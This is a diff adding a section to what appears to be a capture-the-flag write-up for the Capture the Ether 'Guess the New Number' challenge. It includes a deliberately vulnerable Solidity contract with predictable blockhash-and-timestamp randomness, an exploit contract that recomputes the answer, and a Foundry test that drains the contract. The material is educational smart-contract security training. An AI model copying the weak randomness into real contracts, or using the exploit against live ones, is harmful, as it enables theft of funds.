@@ -161,3 +161,98 @@ contract GuessSecretNumberTest is Test {
     receive() external payable {}
 }
 ```
+
+## Capture the Ether (RareSkills Repo) - Guess the New Number
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract GuessNewNumber {
+    constructor() payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function guess(uint8 n) public payable returns (bool pass) {
+        require(msg.value == 1 ether);
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+
+        if (n == answer) {
+            (bool ok,) = msg.sender.call{value: 2 ether}("");
+            require(ok, "Fail to send to msg.sender");
+            pass = true;
+        }
+    }
+}
+```
+
+### Exploit
+
+Since both `blockhash(block.number - 1)` and `block.timestamp` can also be accessed by an attacker contract, we can reproduce `answer` inside an attacker contract using the exact same code:
+
+_GetNewNumber.sol_
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract GuessNewNumber {
+    ...
+}
+
+contract ExploitContract {
+    GuessNewNumber public guessNewNumber;
+    uint8 public answer;
+
+    function Exploit() public returns (uint8) {
+        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+        return answer;
+    }
+}
+```
+
+_GetNewNumber.t.sol_
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import "../src/GuessNewNumber.sol";
+
+contract GuessNewNumberTest is Test {
+    GuessNewNumber public guessNewNumber;
+    ExploitContract public exploitContract;
+
+    function setUp() public {
+        // Deploy contracts
+        guessNewNumber = (new GuessNewNumber){value: 1 ether}();
+        exploitContract = new ExploitContract();
+    }
+
+    function testNumber(uint256 blockNumber, uint256 blockTimestamp) public {
+        // Prevent zero inputs
+        vm.assume(blockNumber != 0);
+        vm.assume(blockTimestamp != 0);
+        // Set block number and timestamp
+        vm.roll(blockNumber);
+        vm.warp(blockTimestamp);
+
+        // Place your solution here
+        uint8 answer = exploitContract.Exploit();
+        _checkSolved(answer);
+    }
+
+    function _checkSolved(uint8 _newNumber) internal {
+        assertTrue(guessNewNumber.guess{value: 1 ether}(_newNumber), "Wrong Number");
+        assertTrue(guessNewNumber.isComplete(), "Balance is supposed to be zero");
+    }
+
+    receive() external payable {}
+}
+```
